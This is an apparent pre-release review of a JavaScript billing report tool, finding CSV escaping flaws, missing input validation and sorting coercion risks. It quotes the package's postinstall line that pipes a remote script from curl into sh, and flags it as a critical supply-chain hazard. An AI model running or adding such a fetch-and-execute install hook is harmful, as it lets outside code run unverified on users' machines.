# Billing Report Tool - Pre-Release Assessment

## Overview
The billing report tool is a simple utility that generates a CSV-formatted billing report by sorting transaction records by total amount. Version 2.3.0 uses a vendored quicksort implementation and includes a postinstall hook.

## Critical Issues

### 1. Security Risk: Arbitrary Code Execution via Postinstall Script
**Severity: CRITICAL**

The `scripts/postinstall.sh` script downloads and executes code from an external URL using `curl | sh`:
```bash
curl -fsSL https://tables.example.com/latest/install.sh | sh
```

**Issues:**
- No cryptographic verification of the downloaded script (no checksums, signatures, or pinned versions)
- Executes arbitrary code during npm install with no user confirmation
- External dependency on `tables.example.com` creates a supply chain attack surface
- Failed network requests will break installations (curl exits on error but sh receives nothing)
- No timeout configuration on curl

**Recommendation:** Replace with a pre-generated tax tables file bundled in the package, or implement secure signature verification before execution.

### 2. CSV Format Issues
**Severity: HIGH**

The output format is invalid CSV and will fail if data contains special characters:
- No header row
- No field escaping or quoting
- Commas in the `name` field will break parsing
- Newlines in the `name` field will break row boundaries
- No special character handling

Example: A name like `"Smith, Inc."` will produce invalid CSV:
```
Smith, Inc.,150.00
```

**Recommendation:** Use proper CSV encoding (RFC 4180) with quoted fields and escaped quotes.

### 3. Insufficient Input Validation
**Severity: HIGH**

The tool assumes well-formed input with no validation:
- No check that `rows` is an array
- No validation that objects have required `name` and `total` fields
- No handling of null/undefined values
- No type validation (e.g., `total` should be numeric)
- Will produce incorrect output or throw runtime errors on invalid input

**Recommendation:** Add input validation with clear error messages.

### 4. Type Coercion Risk in Sorting
**Severity: MEDIUM**

The sort function uses comparison operators (`>`, `<`) that rely on JavaScript type coercion:
```javascript
a[key] > b[key] ? 1 : a[key] < b[key] ? -1 : 0
```

If `total` values are strings instead of numbers, they will be sorted lexicographically (e.g., "9" > "10"). The test only covers numeric values.

**Recommendation:** Add type checking or document that `total` must be a number.

## Test Coverage

### Current Coverage
- One basic test case: rows with numeric totals are sorted ascending

### Gaps
- No test for empty arrays
- No test for null/undefined values
- No test for string totals (could fail silently with wrong sort order)
- No test for special characters in CSV output
- No test for missing `name` or `total` fields
- No test for very large numbers or edge cases (Infinity, NaN)

**Recommendation:** Expand test suite to cover edge cases and error conditions.

## Code Quality

### Missing Documentation
- No JSDoc comments explaining parameters, return values, or error conditions
- No usage examples in README
- No specification of expected input/output format

### Positive Aspects
- Simple, readable implementation
- Avoids mutating input (uses `slice()`)
- No runtime dependencies beyond vendored sort function

## Recommendations Before Release

**Must Fix (Blocking):**
1. Remove or secure the postinstall script with cryptographic verification
2. Implement proper CSV encoding to handle special characters
3. Add input validation with clear error handling

**Should Fix (Non-blocking but recommended):**
4. Expand test coverage for edge cases and error conditions
5. Add JSDoc comments and usage documentation
6. Add type validation or explicit documentation of type requirements
7. Consider adding options parameter for future extensibility (different sort orders, formats)

## Verification Summary

Examined:
- Main report building function in `src/report.js`
- Vendor quicksort implementation in `vendor/quicksort-plus.js`
- Test suite in `test/report.test.js`
- Build configuration in `package.json`
- Postinstall script in `scripts/postinstall.sh`
- Project documentation in `README.md`

The tool is not production-ready for a commercial release due to security risks in the postinstall script and data format issues that will cause failures with real-world billing data.
